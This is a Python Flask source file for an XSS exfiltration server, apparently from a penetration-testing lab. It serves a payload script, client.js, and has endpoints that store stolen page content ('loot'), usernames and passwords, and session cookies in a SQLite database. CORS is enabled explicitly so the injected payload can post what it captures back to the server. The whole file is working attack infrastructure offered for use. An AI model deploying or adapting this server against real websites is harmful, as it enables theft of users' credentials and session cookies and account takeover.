from flask import Flask, request, send_file
from db import create_connection, insert_content, create_db, insert_credential, insert_cookie
from flask_cors import CORS

app = Flask(__name__)
# The CORS header instructs a browser to allow XHR requests to access resources from other origins. 
# This instruct the browser to allow the XSS payload to be able to reach out to the API server to send the discovered content.
CORS(app) # accept connections from any domain
database = r"sqlite.db"

@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', attachment_filename='client.js')

@app.route('/storeContent', methods=['POST'])
def storeContent():
    content = request.form['content']
    location = request.form['location']
    conn = create_connection(database)

    insert_content(conn, (location,content))
    print("[+]Storing loot for location: " + location)
    conn.commit()
    return "loot retrieved"

@app.route('/storeCredentials', methods=['POST'])
def storeCredentials():
    username = request.form['username']
    password = request.form['password']
    conn = create_connection(database)

    insert_credential(conn, (username,password))
    print("[+]Storing creds for user: " + username)
    conn.commit()
    return "Creds retrieved"

@app.route('/storeCookie', methods=['POST'])
def storeCookie():
    key = request.form['key']
    value = request.form['value']
    conn = create_connection(database)

    insert_cookie(conn, (key,value))
    print("[+]Storing cookie: " + key)
    conn.commit()
    return "Cookie retrieved"
 
app.run(host='192.168.119.232', port=443, ssl_context=('cert.pem', 'key.pem'), debug=True)
